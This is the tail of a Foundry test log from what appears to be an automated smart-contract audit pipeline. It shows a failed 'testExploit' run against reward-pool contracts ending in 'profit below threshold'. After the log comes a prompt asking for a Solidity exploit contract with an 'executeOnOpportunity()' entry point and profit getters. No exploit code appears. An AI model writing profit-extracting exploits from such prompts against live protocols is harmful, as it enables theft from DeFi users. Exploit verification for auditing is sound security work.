    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000032feed34f4b35542a2cc1e
    │   │   ├─ [367] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000032feed34f4b35542a2cc1e
    │   │   ├─ [2510] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA::balanceOf(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   │   └─ ← [Return] 18324332959377594684482534 [1.832e25]
    │   │   └─ ← [Return] 0
    │   ├─ [4841] 0x3905A3C1156f67BB55366d7A5a11D1043dcf97c9::getRewardPool(0x0CD6f267b2086bea681E922E19D40512511BE538) [staticcall]
    │   │   └─ ← [Return] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00
    │   ├─ [2409] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00::extraRewardsLength() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2660] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00::extraRewards(0) [staticcall]
    │   │   └─ ← [Return] 0x749cFfCb53e008841d7387ba37f9284BDeCEe0A9
    │   ├─ [2447] 0x749cFfCb53e008841d7387ba37f9284BDeCEe0A9::rewardToken() [staticcall]
    │   │   └─ ← [Return] 0x2a81cec24D2fe558E87bdc662d994934d4ca1BaF
    │   ├─ [22930] 0x749cFfCb53e008841d7387ba37f9284BDeCEe0A9::earned(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   ├─ [2367] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000100104c63adcf9cc4ef7dd
    │   │   ├─ [367] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000100104c63adcf9cc4ef7dd
    │   │   ├─ [2510] 0x3CfB4B26dc96B124D15A6f360503d028cF2a3c00::balanceOf(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   │   └─ ← [Return] 9112106723307917677493169 [9.112e24]
    │   │   └─ ← [Return] 0
    │   ├─ [4841] 0x3905A3C1156f67BB55366d7A5a11D1043dcf97c9::getRewardPool(0xCa978A0528116DDA3cbA9ACD3e68bc6191CA53D0) [staticcall]
    │   │   └─ ← [Return] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93
    │   ├─ [2409] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93::extraRewardsLength() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2660] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93::extraRewards(0) [staticcall]
    │   │   └─ ← [Return] 0x44AfC3944B8175583cCF529F1133a681666Eb67b
    │   ├─ [2447] 0x44AfC3944B8175583cCF529F1133a681666Eb67b::rewardToken() [staticcall]
    │   │   └─ ← [Return] 0x9Dd5fe015fc1FbA955331Ef8a653F299E9b064De
    │   ├─ [22930] 0x44AfC3944B8175583cCF529F1133a681666Eb67b::earned(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   ├─ [2367] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000007073523850d053d3746ee
    │   │   ├─ [367] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000007073523850d053d3746ee
    │   │   ├─ [2510] 0x80c64E468b774F7F96D4DFCe39caE2dd4C2B7f93::balanceOf(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   │   └─ ← [Return] 7087709928479519657513239 [7.087e24]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [720] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2806] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 219.79ms (13.50ms CPU time)

Ran 1 test suite in 331.84ms (219.79ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 509449)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
